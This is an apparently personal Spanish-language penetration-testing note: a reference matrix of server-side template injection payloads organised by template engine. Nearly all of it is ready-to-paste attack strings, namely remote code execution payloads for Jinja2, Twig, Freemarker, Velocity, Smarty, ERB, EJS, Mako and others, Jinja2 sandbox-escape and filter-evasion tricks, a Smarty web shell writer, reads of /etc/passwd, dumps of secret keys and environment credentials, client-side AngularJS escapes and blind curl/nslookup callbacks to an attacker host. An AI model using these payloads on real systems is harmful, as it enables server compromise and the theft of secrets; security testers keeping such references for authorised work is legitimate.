---
tipo: meta
aliases:
  - payloads SSTI
  - Jinja2 RCE
  - Freemarker RCE
tags:
  - meta/referencia
  - dominio/web
---

# SSTI payloads - matriz de referencia

> [!info] Referencia pura, no un zettel
> Qué pegar una vez identificado el motor. Identificarlo es el paso previo y va en [[SSTI - matriz de identificación]]; el criterio, en [[MOC - SSTI]].

## 1. Ejecución directa — motores sin entorno restringido

Ver [[SSTI - ejecución directa]].

**Freemarker**

`<#assign e="freemarker.template.utility.Execute"?new()>${e("id")}`
`${"freemarker.template.utility.Execute"?new()("id")}`

**Velocity**

```
#set($e="")
#set($run=$e.class.forName("java.lang.Runtime").getRuntime())
$run.exec("id")
```

**Smarty**

`{php}system('id');{/php}`
`{system('id')}`
`{Smarty_Internal_Write_File::writeFile($SCRIPT_NAME,"<?php system($_GET['c']); ?>",self::clearConfig())}`

**ERB — Ruby**

`<%= system("id") %>`
`<%= \`id\` %>`
`<%= IO.popen('id').readlines() %>`

**Pug / Jade — Node**

`#{global.process.mainModule.require('child_process').execSync('id')}`

**EJS — Node**

`<%= global.process.mainModule.require('child_process').execSync('id') %>`

**Mako — Python**

`${self.module.cache.util.os.system("id")}`
`<%import os%>${os.system("id")}`

**Thymeleaf**

`__${T(java.lang.Runtime).getRuntime().exec("id")}__::.x`

## 2. Jinja2 — Python con entorno restringido

Ver [[SSTI - escape del entorno restringido]]. El método es trepar hasta las subclases del objeto raíz.

**Lo corto, cuando el marco de trabajo expone algo útil:**

`{{ lipsum.__globals__['os'].popen('id').read() }}`
`{{ cycler.__init__.__globals__.os.popen('id').read() }}`
`{{ joiner.__init__.__globals__.os.popen('id').read() }}`
`{{ namespace.__init__.__globals__.os.popen('id').read() }}`

Los cuatro son ayudantes que Jinja2 trae por defecto y arrastran el módulo del sistema operativo en su espacio global. Es la vía más corta y la primera a probar.

**Flask, cuando está disponible:**

`{{ config.__class__.__init__.__globals__['os'].popen('id').read() }}`
`{{ request.application.__globals__.__builtins__.__import__('os').popen('id').read() }}`
`{{ get_flashed_messages.__globals__.__builtins__.import('os').popen('id').read() }}`

**El recorrido completo, cuando lo de arriba está bloqueado:**

Enumerar en vez de copiar un índice. Un número fijo funciona en el laboratorio y falla en producción.

`{{ ''.__class__.__mro__[1].__subclasses__() }}`

Devuelve todas las clases cargadas. Buscar por nombre en la salida:

`{{ ''.__class__.__mro__[1].__subclasses__()[INDICE]('id',shell=True,stdout=-1).communicate() }}`

Con `Popen` en el índice encontrado. Para localizarlo sin leer la lista entera:

```
{% for c in ''.__class__.__mro__[1].__subclasses__() %}{% if 'Popen' in c.__name__ %}{{ loop.index0 }}{% endif %}{% endfor %}
```

**Lectura de archivos, sin ejecución:**

`{{ ''.__class__.__mro__[1].__subclasses__()[INDICE]('/etc/passwd').read() }}`
Con la clase de manejo de archivos en el índice.

`{{ lipsum.__globals__['os'].popen('cat /etc/passwd').read() }}`

## 3. Jinja2 con filtros — evasión

Cuando el motor bloquea el acceso a atributos con guion bajo:

`{{ ''['\x5f\x5fclass\x5f\x5f'] }}` — escapes hexadecimales
`{{ ''|attr('__class__') }}` — el filtro `attr`
`{{ ''[request.args.c] }}` con `?c=__class__` — el valor viene de otro parámetro
`{{ ''["__cl"+"ass__"] }}` — concatenación

Cuando bloquean palabras concretas:

`{{ request|attr('application')|attr('\x5f\x5fglobals\x5f\x5f') }}`
`{{ (lipsum|attr('__globals__')).os.popen('id').read() }}`

Cuando el largo del campo trunca, el objeto de configuración es mucho más corto que el recorrido completo. Vale como primera opción en campos chicos.

## 4. Twig — PHP

`{{ _self.env.registerUndefinedFilterCallback("exec") }}{{ _self.env.getFilter("id") }}`
Twig 1.x.

`{{ ['id']|filter('system') }}`
`{{ ['id']|map('system')|join }}`
`{{ ['id']|sort('system') }}`
Twig 2.x y 3.x: los filtros que aceptan un invocable.

`{{ "/etc/passwd"|file_excerpt(1,-1) }}`
Symfony con la extensión de depuración cargada.

## 5. Nunjucks — Node

`{{ range.constructor("return global.process.mainModule.require('child_process').execSync('id')")() }}`

## 6. Lectura del contexto — todos los motores

Ver [[SSTI - lectura sin ejecución]]. Es lo primero que conviene pedir, antes de cualquier escalada.

| Motor | Volcar el contexto |
|---|---|
| Jinja2 / Flask | `{{ config }}` · `{{ config.items() }}` · `{{ self.__dict__ }}` |
| Jinja2 — entorno | `{{ lipsum.__globals__['os'].environ }}` |
| Twig | `{{ _context }}` · `{{ dump() }}` |
| Freemarker | `${.data_model}` |
| Velocity | `$context` |
| ERB | `<%= instance_variables %>` · `<%= ENV.to_h %>` |
| Django | `{{ settings.SECRET_KEY }}` — solo si `settings` está en el contexto |

Lo que se busca ahí, en orden de valor:

| Qué | Por qué importa |
|---|---|
| `SECRET_KEY` / clave de firma | Falsificar sesiones y tokens sin ejecutar nada — [[Sesión - falsificación de JWT]] |
| Credenciales de base de datos | Acceso directo, y suelen reusarse |
| Variables de entorno | En contenedor son el depósito de secretos |
| Cabeceras y direcciones internas | Insumo para [[MOC - SSRF]] |

## 7. Lado del cliente — AngularJS

Ver [[SSTI - del lado del cliente]].

`{{constructor.constructor('alert(1)')()}}`
AngularJS ≥ 1.6, donde el entorno restringido se quitó.

`{{'a'.constructor.prototype.charAt=[].join;$eval('x=1} } };alert(1)//');}}`
AngularJS 1.4 y anteriores.

`{{$on.constructor('alert(1)')()}}`

Vue 2:

`{{_c.constructor('alert(1)')()}}`

## 8. Canal ciego

Cuando no hay reflejo. Un identificador distinto por motor para saber cuál respondió:

`{{ lipsum.__globals__['os'].popen('curl http://mi-host/jinja').read() }}`
`<#assign e="freemarker.template.utility.Execute"?new()>${e("curl http://mi-host/freemarker")}`
`<%= system("curl http://mi-host/erb") %>`

Mismo criterio que [[Command injection - canal fuera de banda]]: si el egress está bloqueado, queda la consulta DNS, que suele salir aunque el tráfico HTTP no.

`{{ lipsum.__globals__['os'].popen('nslookup jinja.mi-dominio.com').read() }}`

## 9. Tabla de errores

| Lo que ves | Qué pasa |
|---|---|
| `UndefinedError` sobre un atributo | El entorno restringido bloquea guion bajo. Ver § 3 |
| `IndexError` en `__subclasses__()` | El índice cambió. Enumerar en vez de copiar |
| El payload evalúa y no ejecuta | Motor sin lógica, o `os` no está en ese espacio global. Probar los cuatro ayudantes de § 2 |
| `7777777` donde se esperaba `49` | Es Jinja2, no Twig. Reidentificar |
| La respuesta trunca antes de lo interesante | Pedir un atributo por vez en lugar del objeto entero |
| El payload no entra por largo | Usar el objeto de configuración, o encadenar dos inyecciones |
| Ejecuta y no vuelve nada | Renderizado asíncrono. Ir a canal fuera de banda, § 8 |
| `500` limpio con todo | Errores suprimidos. No implica que no funcione: confirmar por fuera de banda |

## Relacionadas

[[MOC - SSTI]] · [[SSTI - matriz de identificación]] · [[SSTI - ejecución directa]] · [[SSTI - escape del entorno restringido]] · [[Command injection evasión - matriz de referencia]]
